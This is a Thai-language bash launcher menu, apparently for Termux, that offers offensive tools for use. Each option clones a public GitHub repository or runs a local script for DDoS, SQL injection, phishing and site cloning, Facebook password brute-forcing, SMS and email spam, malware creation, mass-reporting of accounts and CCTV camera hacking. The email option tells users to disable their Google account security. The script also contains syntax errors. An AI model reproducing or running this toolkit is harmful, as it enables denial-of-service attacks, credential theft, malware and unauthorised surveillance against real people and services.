blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'   
yellow='\033[33;1m'
clear 
sleep 2
clear
                       
echo "\033[36;1m

████████╗░█████╗░░█████╗░██╗░░░░░░██████╗██╗░░░██╗░█████╗░
╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝██║░░░██║██╔══██╗
░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░╚██╗░██╔╝╚█████╔╝
░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗░╚████╔╝ ██╔══██╗
░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝░░╚██╔   ╚█████╔╝
░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░░░░╚═╝   ░╚════╝░"

echo "       \033[33;1m            v.8 MAX v.15 "

echo ""                                                                                 
echo "\033[36;1m[\033[37;1m01\033[36;1m]\033[31;1m ยิงเน็ต,เว็บ"       "       \033[36;1m[\033[37;1m08\033[36;1m]\033[33;1m weemanก็อปเว็บ "  "   \033[36;1m[\033[37;1m15\033[36;1m]\033[34;1m เปิดโหมดก็อต"
echo "\033[36;1m[\033[37;1m02\033[36;1m]\033[31;1m เจาะเอสคิลเเอล" "   \033[36;1m[\033[37;1m09\033[36;1m]\033[33;1m YouTube like"           "    \033[36;1m[\033[37;1m16\033[36;1m]\033[34;1m ติดตั้งserver.sh"
echo "\033[36;1m[\033[37;1m03\033[36;1m]\033[31;1m ดักรหัสผ่าน"     "        \033[36;1m[\033[37;1m10\033[36;1m]\033[33;1m สร้างไวรัส"       
echo "\033[36;1m[\033[37;1m04\033[36;1m]\033[31;1m เปลี่ยนโลโก้"     "       \033[36;1m[\033[37;1m11\033[36;1m]\033[33;1m ก็อปคริป"
echo "\033[36;1m[\033[37;1m05\033[36;1m]\033[31;1m สุ่มรหัสอื่นๆเช่นfb"   "   \033[36;1m[\033[37;1m12\033[36;1m]\033[33;1m รีพอร์ตเฟส"
echo "\033[36;1m[\033[37;1m06\033[36;1m]\033[31;1m สแปมเอสเอ็มเอส"  "   \033[36;1m[\033[37;1m13\033[36;1m]\033[33;1m สคริปใช้แฮ็ก"
echo "\033[36;1m[\033[37;1m07\033[36;1m]\033[31;1m ยิงข้อความอีเมล"     "    \033[36;1m[\033[37;1m14\033[36;1m]\033[33;1m ดูกล้องวงจร"
echo "" 
echo   "  \033[36;1m[\033[37;1m00\033[36;1m]\033[31;1m ทางออก" 
echo ""
echo     "\033[36;1m[\033[32;1mroot\033[33;1m@\033[32;1mTools\033[36;1m]-\033[31;1m[\033[32;1mDownload\033[31;1m] \033[36;1m"
read -p "L»select>  " korn

if [ $korn = 1 ] || [ $korn = 01 ]
then
clear
figlet "DDOS" | lolcat
cd 
git clone https://github.com/Ha3MrX/DDos-Attack
cd DDos-Attack
python2 ddos-attack.py

fi

if [ $korn = 2 ] || [ $korn = 02 ]
then
cd korn
cd website
bash king.sh

fi

if [ $korn = 3 ] || [ $korn = 03 ]
then
clear
figlet "FISHING" | lolcat
cd
git clone https://github.com/Cesar-Hack-Gray/SocialSploit
cd SocialSploit
bash install.sh
./Sploit


fi

if [ $korn = 4 ] || [ $korn = 04 ]
then
clear
figlet "BANNER" | lolcat
cd
git clone https://github.com/Anonymous-Zpt/T-banner4
cd T-banner4
chmod +x *
bash T-banner
 
fi

if [ $korn = 5 ] || [ $korn = 05 ]
then
figlet "RANDOMPASS" | lolcat
cd korn
cd ran
python2 brute.py

fi

if [ $korn = 6 ] || [ $korn = 06 ]
then
figlet "MODEGOD" | lolcat
cd korn
sh ka.sh

fi

if [ $korn = 7 ] || [ $korn = 07 ]
then
figlet "SPAMEMAIL" | lolcat
cd korn
cd email
echo $green "ไปปิดระบบความปลอดภัย"
sleep 5
echo $green "   มันจะให้เด้งเข้าเว็บไปปิดระบบความปลอดภัยอีเมล"
sleep 7
echo $green "และเลือกบัญชีที่จะใช้ให้จำอีเมลรหัสด้วย"
echo $red "ถ้าไม่ปิดระบบความปลอดภัยบัญชีอาจจะ...ได้ "
sleep 5
echo $green  " เสร็จแล้วให้กลับเข้าแอพเทอมักเหมือนเดิม"
sleep 5
xdg-open https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4NAV9AyGin2yW7RoHvu_nf_M3m16xjg-U_lJd4-xbhHLvZ7Pg71nzq0p345M3R8UWMo1-JwgGKmoQbrAuTSLdwREa5UwA
sh mail.sh


fi

if [ $korn = 8 ] || [ $korn = 08 ]
then
clear
cd
figlet "WEEMAN" | lolcat
git clone https://github.com/evait-security/weeman
echo $green"    พิมพ์ตามนี้ set url ใส่ลิ้งเว็บที่จะก็อบ"
sleep 7
echo $green"    set port ใส่เลข4ตัว"
sleep 7
echo $green"     set action_url ใส่ลิ้งเว็บที่จะก็อบ"
sleep 7
cd weeman
python2 weeman.py

fi

if [ $korn = 9 ] || [ $korn = 09 ]
then
clear
figlet "TOOLSV8" | lolcat
cd korn
cd you
python2 hack.py

fi

if [ $korn = 10 ] || [ $korn = 010 ]
then
clear
figlet "VIRUS" | lolcat
cd
git clone https://github.com/d3L3t3dOn3/Malicious
cd Malicious
unzip Malicious.zip
chmod +x *
cd Maliciou
pip install -r requirements.txt
chmod +x *
python2 malicious.py

fi

if [ $korn = 11 ] || [ $korn = 011 ]
then
clear
figlet "COPY" | lolcat
cd korn
cd kop
sh Noob.sh

fi

if [ $korn = 12 ] || [ $korn = 012 ]
then
clear
figlet "REPORT" | lolcat
cd
git clone https://github.com/IlayTamvan/Report
cd Report
unzip Report.zip
python2 Report.py

fi

if [ $korn = 13 ] || [ $korn = 013 ]
then
clear
figlet "TOOLSV8" | lolcat
cd
git clone https://github.com/Manisso/fsociety
cd fsociety
sh install.sh
python2 fsociety.py

fi

if [ $korn = 14 ] || [ $korn = 014 ]
then
clear
figlet "CCTV" | lolcat
cd
git clone https://github.com/AngelSecurityTeam/Cam-Hackers
cd Cam-Hackers
python cam-hackers.py
fi

if [ $korn = 15 ] || [ $korn = 015 ]
then
figlet "Download script" | lolcat
cd korn
sh kk.sh

fi

if [ $korn = 16 ] || [ $korn = 016 ]
then
figlet "server" | lolcat
echo "" \033[36;1m
cd
git clone https://github.com/sachin175638/server1.git
cd /sdcard/Download/hack6/ks
cd korn
cd server
chmod 777 setup.sh
sh setup.sh
rm setup.sh
cp -f ser.sh $HOME
clear
figlet "Tools v.7 "| lolcat
sh ser.sh
fi


if [ $korn =   ] || [ $korn =    ]
then
echo $red "Error : เกิดข้อผิดพลาด"
sleep 1
echo $red "กรุณาพิมพ์ใหม่อีกครั้งหรือลองใหม่อีกครั้งพิมพ์เฉาะหมายเลขใน[]เท่านั้น"
sleep 10
sh one.sh

fi

if [ $korn = 0 ] || [ $korn = 00 ]
then
echo "By By"
sleep 1
echo บ๊าย บาย ^^
sleep 1.1
exit

fi

function Error {
echo "$red เกิดข้อผิดพลาด โปรเลือกให้ถูกต้อง"
sh one.sh
sleep 1
fi
